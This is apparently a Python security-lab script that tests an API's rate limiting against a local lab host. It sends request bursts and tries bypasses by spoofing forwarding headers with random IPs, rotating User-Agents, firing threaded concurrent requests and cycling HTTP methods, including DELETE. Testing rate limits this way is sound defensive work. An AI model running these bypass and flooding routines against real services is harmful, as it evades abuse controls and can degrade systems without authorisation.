#!/usr/bin/env python3
"""
Critical Lab: API Rate Limiting Bypass and DDoS Simulation
Real-world scenario: Testing rate limiting effectiveness and discovering bypass techniques

This lab covers:
- Rate limit bypass using header manipulation
- Distributed attack simulation
- X-Forwarded-For header abuse
- Timing analysis and adaptive throttling
- Rate limit reset techniques
- Resource exhaustion attacks
"""

import requests
import threading
import time
import random
from collections import defaultdict
from datetime import datetime, timedelta
from typing import Dict, List, Tuple
import concurrent.futures

class RateLimitBypassLab:
    """
    Advanced rate limiting bypass testing lab
    """
    
    def __init__(self, target_url: str, endpoint: str = "/api/users"):
        self.target_url = target_url
        self.endpoint = endpoint
        self.session = requests.Session()
        self.request_count = 0
        self.response_times = []
        self.vulnerabilities = []
    
    def test_no_rate_limiting(self, num_requests: int = 100) -> Dict:
        """
        Test 1: Check if rate limiting is implemented
        Vulnerability: No rate limits, unlimited API access
        """
        print(f"[*] Testing for no rate limiting (sending {num_requests} requests)...")
        
        try:
            start_time = time.time()
            success_count = 0
            
            for i in range(num_requests):
                try:
                    response = self.session.get(
                        f"{self.target_url}{self.endpoint}",
                        timeout=5
                    )
                    if response.status_code == 200:
                        success_count += 1
                    elif response.status_code == 429:  # Too Many Requests
                        print(f"[+] Rate limiting detected at request {i}")
                        return {"vulnerable": False, "rate_limited_at": i}
                except:
                    pass
            
            elapsed = time.time() - start_time
            print(f"[+] Sent {success_count}/{num_requests} requests in {elapsed:.2f}s")
            
            if success_count == num_requests:
                self.vulnerabilities.append("No Rate Limiting - Critical")
                return {"vulnerable": True, "severity": "CRITICAL", "requests_sent": success_count}
        except Exception as e:
            print(f"[!] Error: {e}")
        
        return {"vulnerable": False}
    
    def test_x_forwarded_for_bypass(self) -> Dict:
        """
        Test 2: X-Forwarded-For header bypass
        Vulnerability: Rate limits based on IP can be bypassed
        """
        print("[*] Testing X-Forwarded-For header bypass...")
        
        try:
            for i in range(50):
                # Rotate X-Forwarded-For header with different IPs
                fake_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                
                headers = {
                    "X-Forwarded-For": fake_ip,
                    "X-Real-IP": fake_ip,
                    "CF-Connecting-IP": fake_ip
                }
                
                response = self.session.get(
                    f"{self.target_url}{self.endpoint}",
                    headers=headers,
                    timeout=5
                )
                
                if response.status_code == 200:
                    if i >= 40:
                        self.vulnerabilities.append(f"X-Forwarded-For Bypass - IP Rotation Effective")
                        return {"vulnerable": True, "severity": "HIGH", "method": "IP Rotation"}
                elif response.status_code == 429:
                    break
        except Exception as e:
            print(f"[!] Error: {e}")
        
        return {"vulnerable": False}
    
    def test_user_agent_bypass(self) -> Dict:
        """
        Test 3: User-Agent string variation bypass
        Vulnerability: Rate limits per user agent can be bypassed
        """
        print("[*] Testing User-Agent bypass...")
        
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) Firefox/89.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) Version/14",
            "curl/7.64.1",
        ]
        
        try:
            for i in range(len(user_agents) * 20):
                user_agent = user_agents[i % len(user_agents)]
                
                headers = {"User-Agent": user_agent}
                response = self.session.get(
                    f"{self.target_url}{self.endpoint}",
                    headers=headers,
                    timeout=5
                )
                
                if response.status_code == 429:
                    print(f"[+] Rate limited with {i} requests")
                    if i > 80:
                        self.vulnerabilities.append("User-Agent Bypass - Rate Limit Bypass")
                        return {"vulnerable": True, "severity": "HIGH", "requests": i}
        except Exception as e:
            print(f"[!] Error: {e}")
        
        return {"vulnerable": False}
    
    def test_concurrent_requests(self, num_threads: int = 20) -> Dict:
        """
        Test 4: Concurrent request handling
        Vulnerability: Poor handling of parallel requests
        """
        print(f"[*] Testing concurrent requests with {num_threads} threads...")
        
        def send_request():
            try:
                response = self.session.get(
                    f"{self.target_url}{self.endpoint}",
                    timeout=5
                )
                return response.status_code
            except:
                return None
        
        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
                futures = [executor.submit(send_request) for _ in range(num_threads * 5)]
                results = [f.result() for f in concurrent.futures.as_completed(futures)]
            
            success_count = sum(1 for r in results if r == 200)
            rate_limited = sum(1 for r in results if r == 429)
            
            print(f"[+] Sent {num_threads * 5} concurrent requests")
            print(f"[+] Success: {success_count}, Rate Limited: {rate_limited}")
            
            if rate_limited < (num_threads * 5) * 0.5:  # Less than 50% rate limited
                self.vulnerabilities.append("Poor Concurrent Request Handling")
                return {"vulnerable": True, "severity": "HIGH", "success": success_count}
        except Exception as e:
            print(f"[!] Error: {e}")
        
        return {"vulnerable": False}
    
    def test_rate_limit_reset_timing(self) -> Dict:
        """
        Test 5: Rate limit window timing
        Vulnerability: Predictable rate limit windows
        """
        print("[*] Testing rate limit reset timing...")
        
        try:
            # Send requests rapidly to trigger limit
            for _ in range(30):
                self.session.get(f"{self.target_url}{self.endpoint}", timeout=5)
            
            # Start timing the reset
            reset_time = None
            for second in range(1, 61):
                try:
                    response = self.session.get(
                        f"{self.target_url}{self.endpoint}",
                        timeout=5
                    )
                    if response.status_code == 200:
                        reset_time = second
                        break
                    time.sleep(1)
                except:
                    pass
            
            if reset_time and reset_time < 10:
                self.vulnerabilities.append(f"Fast Rate Limit Reset - {reset_time}s")
                return {"vulnerable": True, "severity": "MEDIUM", "reset_time": reset_time}
        except Exception as e:
            print(f"[!] Error: {e}")
        
        return {"vulnerable": False}
    
    def test_http_method_bypass(self) -> Dict:
        """
        Test 6: HTTP method variation
        Vulnerability: Rate limits not applied across methods
        """
        print("[*] Testing HTTP method bypass...")
        
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS']
        
        try:
            for i in range(len(methods) * 15):
                method = methods[i % len(methods)]
                
                try:
                    if method == 'GET':
                        response = self.session.get(f"{self.target_url}{self.endpoint}", timeout=5)
                    elif method == 'POST':
                        response = self.session.post(f"{self.target_url}{self.endpoint}", timeout=5)
                    elif method == 'PUT':
                        response = self.session.put(f"{self.target_url}{self.endpoint}", timeout=5)
                    elif method == 'DELETE':
                        response = self.session.delete(f"{self.target_url}{self.endpoint}", timeout=5)
                    elif method == 'PATCH':
                        response = self.session.patch(f"{self.target_url}{self.endpoint}", timeout=5)
                    elif method in ['HEAD', 'OPTIONS']:
                        response = self.session.head(f"{self.target_url}{self.endpoint}", timeout=5)
                    
                    if response.status_code == 429:
                        return {"vulnerable": False, "rate_limited_at": i}
                except:
                    pass
            
            self.vulnerabilities.append("HTTP Method Bypass - Different Methods Not Rate Limited")
            return {"vulnerable": True, "severity": "MEDIUM"}
        except Exception as e:
            print(f"[!] Error: {e}")
        
        return {"vulnerable": False}
    
    def run_all_tests(self) -> None:
        """
        Execute all rate limiting tests
        """
        print("\n[+] Starting Critical Rate Limiting Bypass Lab")
        print(f"[+] Target: {self.target_url}")
        print("\n" + "="*60 + "\n")
        
        self.test_no_rate_limiting()
        self.test_x_forwarded_for_bypass()
        self.test_user_agent_bypass()
        self.test_concurrent_requests()
        self.test_rate_limit_reset_timing()
        self.test_http_method_bypass()
        
        print("\n" + "="*60)
        print("[+] Rate Limiting Tests Complete")
        print(f"[+] Vulnerabilities Found: {len(self.vulnerabilities)}")
        print("\n" + "="*60 + "\n")
        
        for idx, vuln in enumerate(self.vulnerabilities, 1):
            print(f"[{idx}] {vuln}")


if __name__ == "__main__":
    target = "http://api.vulnerable-app.local:8080"
    lab = RateLimitBypassLab(target)
    lab.run_all_tests()
